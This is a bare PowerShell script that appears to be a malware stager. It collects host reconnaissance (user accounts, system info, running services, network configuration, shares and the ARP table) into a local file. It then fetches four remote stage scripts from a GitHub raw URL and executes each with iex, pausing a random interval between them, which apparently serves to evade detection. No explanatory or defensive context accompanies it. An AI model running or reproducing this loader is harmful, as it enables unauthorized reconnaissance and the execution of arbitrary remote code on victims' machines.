Write-Output "hostname ##" | Out-File -FilePath .\output.txt
hostname >> output.txt

Write-Output "whoami ##" | Out-File -Append -FilePath .\output.txt
whoami >> output.txt

Write-Output "net user ##" | Out-File -Append -FilePath .\output.txt
net users >> output.txt

Write-Output "sysinfo ##" | Out-File -Append -FilePath .\output.txt
systeminfo >> output.txt

Write-Output "tasklist ##" | Out-File -Append -FilePath .\output.txt
tasklist /SVC >> output.txt

Write-Output "ipconfig ##" | Out-File -Append -FilePath .\output.txt
ipconfig /all >> output.txt

Write-Output "net share ##" | Out-File -Append -FilePath .\output.txt
net share >> output.txt

Write-Output "ARP ##" | Out-File -Append -FilePath .\output.txt
arp -a >> output.tx

(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/encryptedSubject/subject1/main/stage/jS1.ps1") | iex
Start-Sleep (Get-Random -min 60 -max 120)
(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/encryptedSubject/subject1/main/stage/gS1.ps1") | iex
Start-Sleep (Get-Random -min 60 -max 120)
(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/encryptedSubject/subject1/main/stage/kS1.ps1") | iex
Start-Sleep (Get-Random -min 60 -max 120)
(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/encryptedSubject/subject1/main/stage/kS2.ps1") | iex

